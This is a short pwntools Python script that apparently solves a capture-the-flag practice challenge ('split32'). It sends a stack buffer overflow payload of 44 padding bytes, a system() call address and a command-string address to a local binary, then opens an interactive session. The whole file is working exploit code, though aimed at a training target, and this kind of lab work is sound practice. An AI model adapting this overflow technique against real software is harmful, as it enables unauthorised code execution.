#!/usr/bin/python3

from pwn import *

p = process("./split32")

junkdata = b"A" * 44

system_addr = p32(0x0804861a)
bincat_addr = p32(0x0804a030)

payload = junkdata + system_addr + bincat_addr

p.sendline(payload)
p.interactive()
